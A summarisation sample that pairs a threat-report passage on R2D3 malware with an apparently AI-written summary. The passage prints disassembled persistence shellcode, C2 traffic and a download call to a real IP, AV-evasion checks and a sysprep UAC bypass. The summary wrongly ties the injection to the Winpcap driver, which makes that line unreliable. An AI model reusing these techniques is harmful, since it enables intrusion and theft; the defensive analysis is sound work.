@@ -1,0 +1,374 @@
+
+
+
+Sentence : MALWARE STAGE 2 – R2D3
+R2D3 is a second stage (fake PNG) malware that employs stealth tactics and AV avoidance. Its primary
+purpose appears to be to await an encrypted third stage component to execute.
+Stealth Injection. This second stage malware injects shellcode into a new explorer.exe process every time it
+wishes to do something significant, such as network traffic, registry, and file execution operations. This is a
+stealth tactic to bypass firewalls and AV by creating a new explorer.exe process and injecting shellcode into
+the entry point and then terminating the explorer.exe process in the shellcode immediately afterwards.
+AV Engine Detection. The malware checks whether Bitdefender is installed by checking for the mutex
+"BDAgent-oneinstance-mutex" via the CreateMutexA API. It then checks if AVG is installed by looking for an
+event named "AVG{53036606-6F17-41a9-80DD-AB930D6BA4DD}" via the CreateEventA API. If either of
+these exists, the malware will terminate execution.
+Service Installation. So long as AVG and Bitdefender are not detected, the malware will copy itself to
+%COMMONPROGRAMFILES%\CompSvc.exe. It also creates the file
+%COMMONPROGRAMFILES%\SvcStart.exe, which is embedded within the malware. It then injects shellcode
+into a new explorer.exe in order to execute SvcStart.exe with the following command line:
+```
+ SvcStart.exe R2D2 C:\Documents and Settings\user\Local Settings\Temp\filename.ext
+```
+Where "C:\Documents and Settings\user\Local Settings\Temp\filename.ext" is the location of the original
+malware file.
+Analysis indicates that there are two command line prefixes:
+R2D2 : Terminates the currently running malware, deletes it from hard-disk and then executes the newly
+copied version in the common program files directory.
+R2D3 : Does not require a directory to be given in the command line string and results in SvcStart.exe dropping
+a batch file named exp.bat in the %TEMP% directory, which simply cleans up all of the malware as below:
+```
+ :REPEAT
+DEL %1
+IF EXIST %1 GOTO REPEAT
+DEL %2
+```
+TLP-WHITE |  25
+The R2D2 command line is the only one seen used during live analysis, whereas R2D3 appears to be a cleanup function. When the R2D2 command line is used, SvcStart.exe executes the newly created CompSvc.exe,
+which will check if it is running from the common program files directory. If this is the case, it will inject
+shellcode into a new explorer.exe in order to install a persistence key via the Microsoft Active Setup registry
+key location with a custom GUID:
+```
+.data:0044B114 pRegistryShellCode:           ; DATA XREF: sub_41BA5C+5Bo
+.data:0044B114         push  ebp
+.data:0044B115         mov   ebp, esp
+.data:0044B117         sub   esp, 314h
+.data:0044B11D         push  ebx
+.data:0044B11E         xor   ebx, ebx
+.data:0044B120         cmp   [ebp-8], ebx
+.data:0044B123         push  esi
+.data:0044B124         mov   esi, 12345678h
+.data:0044B129         jz   short loc_44B130
+.data:0044B12B         mov   esi, 87654321h
+.data:0044B130
+.data:0044B130 loc_44B130:               ; CODE XREF: .data:0044B129j
+.data:0044B130         push  edi
+.data:0044B131         push  40h
+.data:0044B133         pop   ecx
+.data:0044B134         xor   eax, eax
+.data:0044B136         lea   edi, [ebp-10Bh]
+.data:0044B13C         mov   [ebp-10Ch], bl
+.data:0044B142         rep stosd
+.data:0044B144         stosw
+.data:0044B146         stosb
+.data:0044B147         push  40h
+.data:0044B149         xor   eax, eax
+.data:0044B14B         pop   ecx
+.data:0044B14C         lea   edi, [ebp-20Fh]
+.data:0044B152         mov   [ebp-210h], bl
+.data:0044B158         push  40h
+.data:0044B15A         rep stosd
+.data:0044B15C         stosw
+.data:0044B15E         stosb
+.data:0044B15F         pop   ecx
+.data:0044B160         xor   eax, eax
+.data:0044B162         lea   edi, [ebp-313h]
+.data:0044B168         mov   [ebp-314h], bl
+.data:0044B16E         rep stosd
+.data:0044B170         stosw
+.data:0044B172         push  8003h
+.data:0044B177         mov   [ebp-4], ebx
+.data:0044B17A         stosb
+.data:0044B17B         call  dword ptr [esi+2Ch] ; kernel32.SetErrorMode
+.data:0044B17E         lea   eax, [esi+344h]
+.data:0044B184         push  eax
+.data:0044B185         call  dword ptr [esi+20h] ; GetModuleHandleA("ntdll.dll")
+.data:0044B188         mov   edi, eax
+.data:0044B18A         lea   eax, [esi+354h]
+.data:0044B190         push  eax
+.data:0044B191         push  edi
+.data:0044B192         call  dword ptr [esi+24h] ; GetProcAddress("strlen")
+.data:0044B195         mov   [ebp-8], eax
+.data:0044B198         lea   eax, [esi+374h]
+.data:0044B19E         push  eax
+.data:0044B19F         push  edi
+.data:0044B1A0         call  dword ptr [esi+24h] ; GetProcAddress("strcpy")
+.data:0044B1A3         mov   edi, eax
+.data:0044B1A5         lea   eax, [esi+34h]
+.data:0044B1A8         push  eax
+.data:0044B1A9         lea   eax, [ebp-10Ch]
+.data:0044B1AF         push  eax
+.data:0044B1B0         call  edi       ; ntdll.strcpy
+.data:0044B1B2         lea   eax, [esi+138h]
+.data:0044B1B8         push  eax
+.data:0044B1B9         lea   eax, [ebp-210h]
+.data:0044B1BF         push  eax
+.data:0044B1C0         call  edi       ; ntdll.strcpy
+.data:0044B1C2         lea   eax, [esi+23Ch]
+.data:0044B1C8         push  eax
+.data:0044B1C9         lea   eax, [ebp-314h]
+.data:0044B1CF         push  eax
+.data:0044B1D0         call  edi       ; ntdll.strcpy
+.data:0044B1D2         add   esp, 18h
+.data:0044B1D5         cmp   dword ptr [esi+340h], 1
+.data:0044B1DC         lea   eax, [ebp-4]
+.data:0044B1DF         pop   edi
+.data:0044B1E0         push  eax
+```
+TLP-WHITE |  26
+```
+.data:0044B1E1         lea   eax, [ebp-10Ch]
+.data:0044B1E7         push  eax
+.data:0044B1E8         push  dword ptr [esi+30h]
+.data:0044B1EB         jnz   short loc_44B235 ; RegOpenKeyA
+.data:0044B1ED         call  dword ptr [esi+4] ; RegOpenKeyA("Software\Microsoft\Active Setup\Installed Components\{4C2830A1-7D22-4f20
+ADA2-3901BD61DDE4}")
+.data:0044B1F0         test  eax, eax
+.data:0044B1F2         jz   short loc_44B20C
+.data:0044B1F4         lea   eax, [ebp-4]
+.data:0044B1F7         push  eax
+.data:0044B1F8         lea   eax, [ebp-10Ch]
+.data:0044B1FE         push  eax
+.data:0044B1FF         push  dword ptr [esi+30h]
+.data:0044B202         call  dword ptr [esi] ; RegCreateKeyA("Software\Microsoft\Active Setup\Installed Components\{4C2830A1-7D22-4f20
+ADA2-3901BD61DDE4}")
+.data:0044B204         test  eax, eax
+.data:0044B206         jnz   loc_44B291
+.data:0044B20C
+.data:0044B20C loc_44B20C:               ; CODE XREF: .data:0044B1F2j
+.data:0044B20C         lea   eax, [ebp-314h]
+.data:0044B212         push  eax
+.data:0044B213         call  dword ptr [ebp-8] ; ntdll.strlen
+.data:0044B216         pop   ecx
+.data:0044B217         push  eax
+.data:0044B218         lea   eax, [ebp-314h]
+.data:0044B21E         push  eax
+.data:0044B21F         push  1
+.data:0044B221         lea   eax, [ebp-210h]
+.data:0044B227         push  ebx
+.data:0044B228         push  eax
+.data:0044B229         push  dword ptr [ebp-4]
+.data:0044B22C         call  dword ptr [esi+8] ; RegSetValueExA("C:\Program Files\Common Files\Services\SvcStart.exe")
+.data:0044B22F         test  eax, eax
+.data:0044B231         jnz   short loc_44B28B
+.data:0044B233         jmp   short loc_44B283
+.data:0044B235 ; --------------------------------------------------------------------------
+.data:0044B235
+.data:0044B235 loc_44B235:               ; CODE XREF: .data:0044B1EBj
+.data:0044B235         call  dword ptr [esi+4] ; RegOpenKeyA
+.data:0044B238         test  eax, eax
+.data:0044B23A         jnz   short loc_44B291
+.data:0044B23C         lea   eax, [ebp-210h]
+.data:0044B242         push  eax
+.data:0044B243         call  dword ptr [ebp-8] ; ntdll.strlen
+.data:0044B246         test  eax, eax
+.data:0044B248         pop   ecx
+.data:0044B249         jnz   short loc_44B26C
+.data:0044B24B         push  dword ptr [ebp-4]
+.data:0044B24E         call  dword ptr [esi+14h] ; RegCloseKey
+.data:0044B251         lea   eax, [ebp-10Ch]
+.data:0044B257         push  eax
+.data:0044B258         push  dword ptr [esi+30h]
+.data:0044B25B         call  dword ptr [esi+0Ch] ; RegDeleteKeyA
+.data:0044B25E         test  eax, eax
+.data:0044B260         jnz   short loc_44B291
+.data:0044B262         push  0C8h
+.data:0044B267         call  dword ptr [esi+28h] ; ExitProcess
+.data:0044B26A         jmp   short loc_44B291
+.data:0044B26C ; --------------------------------------------------------------------------
+.data:0044B26C
+.data:0044B26C loc_44B26C:               ; CODE XREF: .data:0044B249j
+.data:0044B26C         lea   eax, [ebp-210h]
+.data:0044B272         push  eax
+.data:0044B273         push  dword ptr [ebp-4]
+.data:0044B276         call  dword ptr [esi+10h] ; RegDeleteValueA
+.data:0044B279         test  eax, eax
+.data:0044B27B         jnz   short loc_44B28B
+.data:0044B27D         push  dword ptr [ebp-4]
+.data:0044B280         call  dword ptr [esi+14h] ; RegCloseKey
+.data:0044B283
+.data:0044B283 loc_44B283:               ; CODE XREF: .data:0044B233j
+.data:0044B283         push  0C8h
+.data:0044B288         call  dword ptr [esi+28h] ; ExitProcess
+.data:0044B28B
+.data:0044B28B loc_44B28B:               ; CODE XREF: .data:0044B231j
+.data:0044B28B                     ; .data:0044B27Bj
+.data:0044B28B         push  dword ptr [ebp-4]
+.data:0044B28E         call  dword ptr [esi+14h] ; RegCloseKey
+.data:0044B291
+.data:0044B291 loc_44B291:               ; CODE XREF: .data:0044B206j
+.data:0044B291                     ; .data:0044B23Aj ...
+.data:0044B291         push  64h
+.data:0044B293         call  dword ptr [esi+28h] ; ExitProcess
+.data:0044B296         pop   esi
+.data:0044B297         xor   eax, eax
+```
+TLP-WHITE |  27
+```
+.data:0044B299         pop   ebx
+.data:0044B29A         leave
+.data:0044B29B         retn
+```
+Winpcap. After the shellcode is injected, the malware will load the winpcap npf.sys driver if it exists. It then
+begins to monitor all network adapters in order to determine which interface is the primary adapter that can
+access the internet. Then, it makes a POST request to the C2 server with gzip compressed system
+information:
+```
+ POST http://101.99.68.5/bbs/CaC.php HTTP/1.1
+ Content-Type: multipart/form-data; boundary=--HC-MPFD-BOUNDARY
+ Content-Length: 320
+ User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)
+ Chrome/36.0.1985.125 Safari/537.36
+Host: 101.99.68.5
+Proxy-Connection: Keep-Alive
+ Pragma: no-cache
+----HC-MPFD-BOUNDARY
+Content-Disposition: form-data; name="id"
+AAwp2ySc
+----HC-MPFD-BOUNDARY
+Content-Disposition: form-data; name="userfile"; filename="AAwp2ySc.ifo"
+ Content-Type: application/octet-stream
+```
+�������
+s � s � u � R �� t �� w
+��� s
+� R054644 ���� R � 5246 �� 4415 �� r ����� K ������ ? ���
+----HC-MPFD-BOUNDARY-
+The "id" value "AAwp2ySc" is a base64 encoded version of the MAC address's hexadecimal values for the
+adapter that is determined to be the primary one, which in this instance was “ 00 0c 29 db 24 9c” . The gzip
+compressed data, in plaintext looks like this example:
+```
+ CNAME: MICROSOFT
+OSVER: 513112
+IP: -2132891456
+DNAME: None
+```
+Next, the malware injects shellcode into explorer.exe to contact its C2 with a GET request, which seems to
+expect another encrypted malware to be returned. The following shows parts of the shellcode (dumped from
+Ollydbg), which shows this C2 server communication. The comments indicate what the values of certain
+registers and addresses are in real time. Again, the MAC address identifier can be seen in the following
+network traffic shellcode:
+```
+ 0101A63E      8D6E 1C           LEA EBP,DWORD PTR DS:[ESI+0x1C]      ; http://101.99.68.5/bbs/CaC.php?id=AAwp2ySc
+...
+0101A667      8D86 70050000        LEA EAX,DWORD PTR DS:[ESI+0x570]     ; URLDownloadToFileA
+0101A66D      50             PUSH EAX
+0101A66E      53             PUSH EBX                 ; HMODULE = urlmon.dll
+0101A66F      FF56 08           CALL DWORD PTR DS:[ESI+0x8]        ; kernel32.GetProcAddress
+ 0101A672      8BD8            MOV EBX,EAX
+ 0101A674      85DB            TEST EBX,EBX
+ 0101A676      75 05            JNZ SHORT explorer.0101A67D
+0101A678      6A 64            PUSH 0x64
+0101A67A      FF56 0C           CALL DWORD PTR DS:[ESI+0xC]        ; kernel32.ExitProcess
+ 0101A67D      8D86 6C040000        LEA EAX,DWORD PTR DS:[ESI+0x46C]     ; C:\DOCUME~1\user\LOCALS~1\Temp\tmp2F.tmp
+0101A683      6A 00            PUSH 0x0
+0101A685      6A 00            PUSH 0x0
+0101A687      50             PUSH EAX
+0101A688      55             PUSH EBP                 ; http://101.99.68.5/bbs/CaC.php?id=AAwp2ySc
+0101A689      6A 00            PUSH 0x0
+0101A68B      FFD3            CALL EBX                 ; URLDownloadToFileA
+```
+TLP-WHITE |  28
+The code continues on to delete a Zone.Identifier ADS for msvcrt.dll (msvcrt.dll:Zone.Identifier). The purpose
+of this part of the code is unclear, because msvcrt.dll does not seem to be overwritten by the malware and
+should not contain a Zone.Identifier record that prevents its usage in any way.
+Malware Configuration. The malware also contains a configuration of sorts. Some of the parts include:
+```
+ S[32]:inner_UniqID=4C2830A17D224f20ADA23901BD61DDE4
+ B:inner_Escl=1
+ S[260]Exe Location=C:\Program Files\Common Files\Services\CompSvc.exe
+```
+Each field is preceded by the length and type of the value associated with it. For example: S[32] means that
+the value contains a string of 32 characters.
+The inner_UniqID value seems to be a static value, probably used as a campaign identifier.
+The inner_Escl value is a Boolean, indicating whether escalated permissions are available. If not, then
+the malware drops a DLL payload into the Windows sysprep folder under the name cryptbase.dll. It
+then launches sysprep.exe, which will run with administrative permissions and load up cryptbase.dll
+from the current folder rather than the system folder. This technique is a commonly used means of
+bypassing Windows User Account Control (UAC).
+
+The Exe Location value is the current location of the malware.
+
+TLP-WHITE |  29
+Output : 
+### Analysis and Summary
+
+This document provides an in-depth analysis of a piece of malware, detailing its behavior, network communications, and configuration. Here’s a summary:
+
+#### Shellcode Injection and Execution
+1. **Shellcode Injection**:
+   - The malware injects shellcode into the `explorer.exe` process.
+   - This injection is facilitated by loading the Winpcap driver (`npf.sys`) if it exists on the system.
+
+2. **Network Monitoring**:
+   - After injection, the malware monitors all network adapters to identify the primary adapter with internet access.
+
+3. **C2 Communication**:
+   - The malware makes a POST request to the C2 server using the following URL: `http://101.99.68.5/bbs/CaC.php`.
+   - The request includes system information in gzip compressed format.
+   - The "id" value in the request is a base64 encoded version of the MAC address of the primary network adapter.
+
+#### Network Traffic Example
+- **POST Request**:
+  ```http
+  POST http://101.99.68.5/bbs/CaC.php HTTP/1.1
+  Content-Type: multipart/form-data; boundary=--HC-MPFD-BOUNDARY
+  Content-Length: 320
+  User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)
+  Chrome/36.0.1985.125 Safari/537.36
+  Host: 101.99.68.5
+  Proxy-Connection: Keep-Alive
+  Pragma: no-cache
+
+  ----HC-MPFD-BOUNDARY
+  Content-Disposition: form-data; name="id"
+  AAwp2ySc
+  ----HC-MPFD-BOUNDARY
+  Content-Disposition: form-data; name="userfile"; filename="AAwp2ySc.ifo"
+  Content-Type: application/octet-stream
+
+  �������s � s � u � R �� t �� w���� s� R054644 ���� R � 5246 �� 4415 �� r ����� K ������ ? ���
+  ----HC-MPFD-BOUNDARY-
+  ```
+  - The "id" value `AAwp2ySc` is derived from the MAC address `00 0c 29 db 24 9c`.
+  - The gzip compressed data, when decompressed, contains system information:
+    ```plaintext
+    CNAME: MICROSOFT
+    OSVER: 513112
+    IP: -2132891456
+    DNAME: None
+    ```
+
+#### Shellcode Analysis
+- **Shellcode Execution**:
+  - The shellcode is injected into `explorer.exe` and makes a GET request to the C2 server.
+  - It uses `URLDownloadToFileA` from `urlmon.dll` to download additional data.
+  - The URL for the GET request includes the same "id" value: `http://101.99.68.5/bbs/CaC.php?id=AAwp2ySc`.
+
+- **ADS Deletion**:
+  - The malware deletes a Zone.Identifier Alternate Data Stream (ADS) for `msvcrt.dll` (`msvcrt.dll:Zone.Identifier`).
+  - The purpose of this action is unclear, as `msvcrt.dll` does not appear to be modified by the malware.
+
+#### Malware Configuration
+- **Configuration Fields**:
+  - **inner_UniqID**: A static value used as a campaign identifier.
+    ```plaintext
+    S[32]:inner_UniqID=4C2830A17D224f20ADA23901BD61DDE4
+    ```
+  - **inner_Escl**: A Boolean indicating whether escalated permissions are available.
+    ```plaintext
+    B:inner_Escl=1
+    ```
+  - **Exe Location**: The current location of the malware.
+    ```plaintext
+    S[260]Exe Location=C:\Program Files\Common Files\Services\CompSvc.exe
+    ```
+
+- **Behavior Based on Configuration**:
+  - If escalated permissions are not available, the malware drops a DLL payload named `cryptbase.dll` into the Windows sysprep folder.
+  - It then launches `sysprep.exe`, which runs with administrative permissions and loads the dropped `cryptbase.dll`.
+  - This technique is used to bypass Windows User Account Control (UAC).
+
+### Conclusion
+This malware demonstrates sophisticated techniques for maintaining persistence, evading detection, and communicating with a C2 server. The use of shellcode injection, network monitoring, and UAC bypass are notable tactics. Understanding these behaviors is crucial for developing effective countermeasures and improving security measures.
+
+TLP-WHITE | 30
